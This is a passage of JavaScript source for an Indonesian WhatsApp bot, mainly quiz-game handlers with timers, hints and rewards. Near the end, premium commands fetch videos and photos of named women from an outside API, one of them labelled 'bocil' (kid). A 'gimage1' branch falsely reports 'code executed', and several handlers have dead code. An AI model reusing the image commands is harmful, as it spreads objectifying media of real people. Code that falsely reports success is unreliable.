delete tebakkata[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else juna.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .teka untuk bantuan dan .yteka untuk menyerah 🎮`, footxt, '.teka', 'Hint', '.yteka', 'Nyerah', m)
 }
}
if (tebakbendera[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakbendera[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakbendera[m.chat][1]))
jawaban = json.name.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebakbendera[m.chat][2], balance) 
await newReply(JwbTrue("Tebak Bendera", tebakbendera[m.chat][2]) + `\n\nKirim perintah .tebakbendera untuk bermain lagi 🎮`, footxt, m)
clearTimeout(tebakbendera[m.chat][3])
delete tebakbendera[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else juna.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .tebe untuk bantuan dan .ytebe untuk menyerah 🎮`, footxt, '.tebe', 'Hint', '.ytebe', 'Nyerah', m)
 }
}
if (caklontong[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == caklontong[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(caklontong[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, caklontong[m.chat][2], balance)
await newReply(JwbTrue("Cak Lontong", caklontong[m.chat][2]) + `\n\nKirim perintah .caklontong untuk bermain lagi 🎮`, footxt, m)
clearTimeout(caklontong[m.chat][3])
delete caklontong[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else juna.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .telo untuk bantuan dan .ytelo untuk menyerah 🎮`, footxt, '.telo', 'Hint', '.ytelo', 'Nyerah', m)
 }
}
if (susunkata[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == susunkata[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(susunkata[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, susunkata[m.chat][2], balance) 
await newReply(JwbTrue("Susun Kata", susunkata[m.chat][2]) + `\n\nKirim perintah .susunkata untuk bermain lagi 🎮`, footxt, m)
clearTimeout(susunkata[m.chat][3])
delete susunkata[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else newReply("❌ Jawaban salah" + `\n\nKirim perintah .tesuka untuk bantuan dan .ytesuka untuk menyerah 🎮`)
 }
}
if (tebakkalimat[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakkalimat[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakkalimat[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebakkalimat[m.chat][2], balance) 
await newReply (JwbTrue("Tebak Kalimat", tebakkalimat[m.chat][2]) + `\n\nKirim perintah .tebakkalimat untuk bermain lagi 🎮`, footxt, m)
clearTimeout(tebakkalimat[m.chat][3])
delete tebakkalimat[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else juna.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .tekatu untuk bantuan dan .ytekatu untuk menyerah 🎮`, footxt, '.tekatu', 'Hint', '.ytekatu', 'Nyerah', m)
 }
}
if (siapaaku[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == siapaaku[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(siapaaku[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, siapaaku[m.chat][2], balance)
await newReply (JwbTrue("Tebak Siapa", siapaaku[m.chat][2]) + `\n\nKirim perintah .tebaksiapa untuk bermain lagi 🎮`, footxt, m)
clearTimeout(siapaaku[m.chat][3])
delete siapaaku[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else juna.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .tesi untuk bantuan dan .ytesi untuk menyerah 🎮`, footxt, '.tesi', 'Hint', '.ytesi', 'Nyerah', m)
 }
}
if (tekateki[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tekateki[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tekateki[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tekateki[m.chat][2], balance) 
await newReply (JwbTrue("Teka Teki", tekateki[m.chat][2]) + `\n\nKirim perintah .tekateki untuk bermain lagi 🎮`, footxt, m)
clearTimeout(tekateki[m.chat][3])
delete tekateki[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else juna.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .tete untuk bantuan dan .ytete untuk menyerah 🎮`, footxt, '.tete', 'Hint', '.ytete', 'Nyerah', m)
 }
}
if (tebakkimia[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakkimia[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakkimia[m.chat][1]))
jawaban = json.unsur.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebakkimia[m.chat][2], balance)
await newReply (JwbTrue("Teka Kimia", tebakkimia[m.chat][2]) + `\n\nKirim perintah .tebakkimia untuk bermain lagi 🎮`, footxt, m)
clearTimeout(tebakkimia[m.chat][3])
delete tebakkimia[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else juna.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .teki untuk bantuan dan .yteki untuk menyerah 🎮`, footxt, '.teki', 'Hint', '.yteki', 'Nyerah', m)
 }
}
if (tebaklirik[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebaklirik[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebaklirik[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebaklirik[m.chat][2], balance) 
await newReply (JwbTrue("Teka Lirik", tebaklirik[m.chat][2]) + `\n\nKirim perintah .tebaklirik untuk bermain lagi 🎮`, footxt, m)
clearTimeout(tebaklirik[m.chat][3])
delete tebaklirik[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else juna.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .teli untuk bantuan dan .yteli untuk menyerah 🎮`, footxt, '.teli', 'Hint', '.yteli', 'Nyerah', m)
 }
}
if (gimage1[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == gimage1[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebaklirik[m.chat][1]))
jawaban = 'y'
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebaklirik[m.chat][2], balance) 
await newReply ('sukses eksekusi kode')
clearTimeout(gimage1[m.chat][3])
delete gimage1[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else juna.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .teli untuk bantuan dan .yteli untuk menyerah 🎮`, footxt, '.teli', 'Hint', '.yteli', 'Nyerah', m)
 }
}
if (tebaktebakan[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebaktebakan[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebaktebakan[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebaktebakan[m.chat][2], balance) 
await newReply (JwbTrue("Teka Tebakan", tebaktebakan[m.chat][2]) + `\n\nKirim perintah .tebaktebakan untuk bermain lagi 🎮`, footxt, m)
clearTimeout(tebaktebakan[m.chat][3])
delete tebaktebakan[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
newReply(`_Ya, Dikit Lagi!_`)
else juna.send2ButMes(m.chat, "❌ Jawaban salah" + `\n\nKirim perintah .teteb untuk bantuan dan .yteteb untuk menyerah 🎮`, footxt, '.teteb', 'Hint', '.yteteb', 'Nyerah', m)
 }
}


 if (m.isGroup && !m.key.fromMe) {
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let ment of mentionUser) {
if (afk.checkAfkUser(ment, _afk)) {
let getId2 = afk.getAfkId(ment, _afk)
let getReason2 = afk.getAfkReason(getId2, _afk)
let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
let heheh2 = ms(getTimee)
newReply(`Jangan tag, dia sedang afk\n\n*Reason :* ${getReason2}\n*Sejak :* ${heheh2.hours} jam, ${heheh2.minutes} menit, ${heheh2.seconds} detik yg lalu\n`)
}
}
if (afk.checkAfkUser(m.sender, _afk)) {
let getId = afk.getAfkId(m.sender, _afk)
let getReason = afk.getAfkReason(getId, _afk)
let getTime = Date.now() - afk.getAfkTime(getId, _afk)
let heheh = ms(getTime)
_afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
fs.writeFileSync('./database/afk.json', JSON.stringify(_afk))
juna.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} telah kembali dari afk\n\n*Reason :* ${getReason}\n*Selama :* ${heheh.hours} jam ${heheh.minutes} menit ${heheh.seconds} detik\n`, m)
}
}
if (jam === 5) {
  console.log("triger berhasi")
  if (m.isGroup &&(isAutoAiGc || setting.auto_ai_grup) && !isCmd) {
    try {
    newReply("Sedang dilakukan maintenace pada bot selama satu jam\nHarap menunggu")
    } catch (err) {
    //console.log(err);
    newReply("Upss error silahkan hubungi owner agar di fix")
    //newReply(JSON.stringify(err));
    }
    }
  }

switch(command) {
case "tebakgambar": {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (tebakgambar[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgambar[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakgambar[m.chat] = [
await juna.sendMessage(m.chat, {
image: {
url: result.img
},
caption: `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : ${(120000 / 1000).toFixed(2)} detik`
}, {
quoted: m
}), result, 250,
setTimeout(() => {
if (tebakgambar[m.chat]) {
return newReply (waktuHabis(result.jawaban), footxt, m)
delete tebakgambar[m.chat]
}
}, 120000)
]
}
break
// nhentai
// case 'nhentai': {
//   if (isBan) return newReply('Lu mau ngapain?')
//   if (!isCreator && !isAdmins) {
//     doujin.validate().then(console.log)
//     doujin.fetch().then(console.log)
//     doujin.save().then(console.log)


//   }




















// }
// break
case 'tega': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in tebakgambar)) return
let json = tebakgambar[m.chat][1]
juna.send1ButMes(m.chat, '```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', footxt, '.ytega', 'Dahlah Nyerah Aja✌️', m)
}
break
case 'ytega': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in tebakgambar)) return
clearTimeout(tebakgambar[m.chat][3])
delete tebakgambar[m.chat]
return juna.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
case "tebakgame": {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (tebakgame[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgame[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/qisyana/scrape/main/tebakgame.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakgame[m.chat] = [
await juna.sendMessage(m.chat, {
image: {
url: result.img
},
caption: `Gambar diatas adalah game?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik`
}, {
quoted: m
}),
result, 250,
setTimeout(() => {
if (tebakgame[m.chat]) {
return newReply (waktuHabis(result.jawaban), footxt, m)
delete tebakgame[m.chat]
}
}, 120000)
]
}
break
case 'tegem': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in tebakgame)) return
let json = tebakgame[m.chat][1]
juna.send1ButMes(m.chat, '```' + json.name.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', footxt, '.ytebe', 'Dahlah Nyerah Aja✌️', m)
}
break
case 'ytegem': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in tebakgame)) return
clearTimeout(tebakgame[m.chat][3])
delete tebakgame[m.chat]
return juna.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
case "tebakkata": {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (tebakkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkata[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakkata[m.chat] = [
await juna.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (tebakkata[m.chat]) {
return newReply (waktuHabis(result.jawaban), footxt, m)
delete tebakkata[m.chat]
}
}, 120000)
]
}
break
case 'family100': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply(mess.OnlyGrup)
if ('family100'+m.chat in _family100) {
m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
throw false
}
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
let random = anu[Math.floor(Math.random() * anu.length)]
let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
_family100['family100'+m.chat] = {
id: 'family100'+m.chat,
pesan: await juna.sendText(m.chat, hasil, m),
...random,
terjawab: Array.from(random.jawaban, () => false),
hadiah: 6,
}
}
break
case 'teka': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in tebakkata)) return
let json = tebakkata[m.chat][1]
juna.send1ButMes(m.chat, '```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', footxt, '.yteka', 'Dahlah Nyerah Aja✌️', m)
}
break
case 'yteka': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in tebakkata)) return
clearTimeout(tebakkata[m.chat][3])
delete tebakkata[m.chat]
return juna.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
case "tebakbendera": {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (tebakbendera[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakbendera[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.name)
tebakbendera[m.chat] = [
await juna.sendMessage(m.chat, {
image: {
url: result.img
},
caption: `Gambar diatas adalah bendera negara?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik`
}, {
quoted: m
}),
result, 250,
setTimeout(() => {
if (tebakbendera[m.chat]) {
return newReply (waktuHabis(result.name), footxt, m)
delete tebakbendera[m.chat]
}
}, 120000)
]
}
break
case 'tebe': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in tebakbendera)) return
let json = tebakbendera[m.chat][1]
juna.send1ButMes(m.chat, '```' + json.name.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', footxt, '.ytebe', 'Dahlah Nyerah Aja✌️', m)
}
break
case 'ytebe': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in tebakbendera)) return
clearTimeout(tebakbendera[m.chat][3])
delete tebakbendera[m.chat]
return juna.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
case 'tebakkalimat': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (tebakkalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkalimat[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakkalimat[m.chat] = [
await juna.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (tebakkalimat[m.chat]) {
return newReply (waktuHabis(result.jawaban), footxt, m)
delete tebakkalimat[m.chat]
}
}, 120000)
]
}
break
case 'tekatu': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in tebakkalimat)) return
let json = tebakkalimat[m.chat][1]
juna.send1ButMes(m.chat, '```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', footxt, '.ytekatu', 'Dahlah Nyerah Aja✌️', m)
}
break
case 'ytekatu': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in tebakkalimat)) return
clearTimeout(tebakkalimat[m.chat][3])
delete tebakkalimat[m.chat]
return juna.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
case 'tebaksiapa': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (siapaaku[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: siapaaku[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
siapaaku[m.chat] = [
await juna.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (siapaaku[m.chat]) {
return newReply (waktuHabis(result.jawaban), footxt, m)
delete siapaaku[m.chat]
}
}, 120000)
]
}
break
case 'tesi': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in siapaaku)) return
let json = siapaaku[m.chat][1]
juna.send1ButMes(m.chat, '```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', footxt, '.ytesi', 'Dahlah Nyerah Aja✌️', m)
}
break
case 'ytesi': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in siapaaku)) return
clearTimeout(siapaaku[m.chat][3])
delete siapaaku[m.chat]
return juna.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
case 'tebakkimia': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (tebakkimia[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkimia[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.unsur)
tebakkimia[m.chat] = [
await juna.sendText(m.chat, `Apa Arti Dari Simbol : *${result.lambang}*?\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (tebakkimia[m.chat]) {
return newReply (waktuHabis(result.unsur), footxt, m)
delete tebakkimia[m.chat]
}
}, 120000)
]
}
break
case 'teki': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in tebakkimia)) return
let json = tebakkimia[m.chat][1]
juna.send1ButMes(m.chat, '```' + json.unsur.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', footxt, '.yteki', 'Dahlah Nyerah Aja✌️', m)
}
break
case 'yteki': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in tebakkimia)) return
clearTimeout(tebakkimia[m.chat][3])
delete tebakkimia[m.chat]
return juna.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
case 'tebaklirik': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (tebaklirik[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaklirik[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebaklirik[m.chat] = [
await juna.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (tebaklirik[m.chat]) {
return newReply (waktuHabis(result.jawaban), footxt, m)
delete tebaklirik[m.chat]
}
}, 120000)
]
}
break
case 'teli': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in tebaklirik)) return
let json = tebaklirik[m.chat][1]
juna.send1ButMes(m.chat, '```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', footxt, '.yteli', 'Dahlah Nyerah Aja✌️', m)
}
break
case 'yteli': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in tebaklirik)) return
clearTimeout(tebaklirik[m.chat][3])
delete tebaklirik[m.chat]
return juna.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
case 'tebaktebakan': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (tebaktebakan[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaktebakan[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebaktebakan[m.chat] = [
await juna.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (tebaktebakan[m.chat]) {
return newReply (waktuHabis(result.jawaban), footxt, m)
delete tebaktebakan[m.chat]
}
}, 120000)
]
}
break
case 'teteb': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in tebaktebakan)) return
let json = tebaktebakan[m.chat][1]
juna.send1ButMes(m.chat, '```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', footxt, '.yteteb', 'Dahlah Nyerah Aja✌️', m)
}
break
case 'yteteb': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in tebaktebakan)) return
clearTimeout(tebaktebakan[m.chat][3])
delete tebaktebakan[m.chat]
return juna.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
case 'susunkata': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (susunkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: susunkata[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
susunkata[m.chat] = [
await juna.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\nSoal : ${result.soal}\nTipe : ${result.tipe}\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (susunkata[m.chat]) {
return newReply (waktuHabis(result.jawaban), footxt, m)
delete susunkata[m.chat]
}
}, 120000)
]
}
break
case 'tesuka': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in susunkata)) return
let json = susunkata[m.chat][1]
juna.send1ButMes(m.chat, '```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', footxt, '.ytesuka', 'Dahlah Nyerah Aja✌️', m)
}
break
case 'ytesuka': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in susunkata)) return
clearTimeout(susunkata[m.chat][3])
delete susunkata[m.chat]
return juna.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
case 'caklontong': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (caklontong[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: caklontong[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
caklontong[m.chat] = [
await juna.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\nSoal : ${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\nJika Anda Merasa Ga Mampu Silahkan Ketik .ytelo`, m), result, 250,
setTimeout(() => {
if (caklontong[m.chat]) {
return newReply (waktuHabis(result.jawaban), footxt, m)
delete caklontong[m.chat]
}
}, 120000)
]
}
break
case 'telo': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in caklontong)) return
let json = caklontong[m.chat][1]
juna.send1ButMes(m.chat, '```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', footxt, '.ytelo', 'Dahlah Nyerah Aja✌️', m)
}
break
case 'ytelo': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in caklontong)) return
clearTimeout(caklontong[m.chat][3])
delete caklontong[m.chat]
return juna.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
case 'tekateki': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (tekateki[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tekateki[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tekateki[m.chat] = [
await juna.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (tekateki[m.chat]) {
return newReply (waktuHabis(result.jawaban), footxt, m)
delete tekateki[m.chat]
}
}, 120000)
]
}
break
case 'tete': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in tekateki)) return
let json = tekateki[m.chat][1]
juna.send1ButMes(m.chat, '```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', footxt, '.ttete', 'Dahlah Nyerah Aja✌️', m)
}
break
case 'ttete': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!(m.chat in tekateki)) return
clearTimeout(tekateki[m.chat][3])
delete tekateki[m.chat]
return juna.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
//asupan
case'chika': case'rikagusriani': case'bocil': case'geayubi': case'santuy': case'ukhty': case'asupan': case'delvira': case'ayu': case'bunga': case'aura': case'nisa': case'ziva': case'yana': case'viona': case'syania': case'riri': case'syifa': case'mama_gina': case'alcakenya': case'mangayutri': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!isCreator && !isPremium)return newReply(mess.OnlyPrem)
newReply(mess.wait)
juna.sendMessage(m.chat, {video: {url: `https://api.zeeoneofc.my.id/api/asupan/${command}?apikey=${setting.BotKey}`, mimetype:'video/mp4'}, caption: 'Nih asupan guys 😋'},{quoted: m})
.catch((err) => {
newReply(util.format(err))
})
}
break
//cewek asia
case'vietnam': case'malaysia': case'korea': case'indonesia': case'japan': case'thailand': case'china':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
newReply(mess.wait)
let cecan = await getBuffer(`https://api.zeeoneofc.my.id/api/cecan/${command}?apikey=${setting.BotKey}`)
await juna.sendMessage(m.chat, {image: cecan, caption: `Nih kak foto ${command} nya 😋`},{quoted: m})
}
break
case'jiso': case'lisa': case'rose':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
newReply(mess.wait)
